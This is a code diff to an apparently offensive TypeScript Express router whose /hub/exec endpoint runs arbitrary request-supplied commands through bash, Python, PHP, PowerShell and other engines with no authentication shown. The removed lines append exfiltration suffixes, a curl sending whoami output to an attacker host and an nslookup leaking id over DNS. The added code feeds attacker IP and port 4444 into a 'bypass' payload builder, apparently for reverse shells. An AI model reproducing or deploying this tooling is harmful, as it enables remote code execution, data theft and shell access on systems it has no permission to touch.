@@ -24,53 +24,56 @@ function checkBin(cmd: string): boolean {
 router.get("/hub/health", (_req: Request, res: Response) => {
   res.json({
     status: "online",
-    version: "4.0.0",
+    version: "5.0.0",
     timestamp: new Date().toISOString(),
-    engines: ["php", "node", "python", "java", "cpp", "powershell", "bash"],
+    engines: ["bash", "node", "python", "php", "java", "cpp", "powershell"],
   });
 });
 
 router.get("/hub/engines", (_req: Request, res: Response) => {
   res.json({
-    php: checkBin("php --version"),
-    node: true,
-    python: checkBin("python3 --version"),
-    java: checkBin("java -version"),
-    cpp: checkBin("gcc --version"),
+    bash:       true,
+    node:       true,
+    python:     checkBin("python3 --version"),
+    php:        checkBin("php --version"),
+    java:       checkBin("java -version"),
+    cpp:        checkBin("gcc --version"),
     powershell: checkBin("pwsh --version") || checkBin("powershell -v"),
-    bash: true,
   });
 });
 
 router.post("/hub/exec", async (req: Request, res: Response) => {
   const start = Date.now();
-  const { cmd, engine = "node/exec", mode = "classic", attacker = "exfil.lab.local" } = req.body as {
+  const {
+    cmd,
+    engine     = "bash/bash",
+    mode       = "classic",
+    attackerIp = "127.0.0.1",
+    attackerPort = "4444",
+  } = req.body as {
     cmd?: string;
     engine?: string;
     mode?: string;
-    attacker?: string;
+    attackerIp?: string;
+    attackerPort?: string;
   };
 
-  if (!cmd || typeof cmd !== "string") {
+  if (!cmd || typeof cmd !== "string" || !cmd.trim()) {
     res.status(400).json({ error: "cmd is required" });
     return;
   }
 
-  let processed = applyQuantumBypass(cmd, mode);
-  if (mode === "blind") processed += " && sleep 6 || echo fast";
-  if (mode === "oob") processed += ` && curl -s http://${attacker}/?d=$(whoami)`;
-  if (mode === "quantum") processed += " && nslookup $(id).exfil.lab.local";
-
+  const processed = applyQuantumBypass(cmd, mode, attackerIp, attackerPort);
   const [lang, func = "exec"] = engine.split("/");
 
-  let output = "Engine executed";
+  let output = "";
   try {
-    if (lang === "php") output = runPhp(processed, func);
-    else if (lang === "node") output = await runNode(processed, func);
+    if (lang === "bash")       output = runBash(processed);
+    else if (lang === "node")  output = await runNode(processed, func);
     else if (lang === "python") output = runPython(processed, func);
-    else if (lang === "java") output = runJava(processed, func);
-    else if (lang === "cpp") output = runCpp(processed, func);
-    else if (lang === "bash") output = runBash(processed);
+    else if (lang === "php")   output = runPhp(processed, func);
+    else if (lang === "java")  output = runJava(processed, func);
+    else if (lang === "cpp")   output = runCpp(processed, func);
     else if (lang === "powershell") output = runPowershell(processed);
     else {
       res.status(400).json({ error: `Unknown engine: ${lang}` });
@@ -84,7 +87,7 @@ router.post("/hub/exec", async (req: Request, res: Response) => {
   logInjection(cmd, engine, mode, elapsed);
 
   res.json({
-    output: typeof output === "string" ? output : JSON.stringify(output),
+    output: typeof output === "string" ? output : String(output),
     engine,
     mode,
     elapsed,
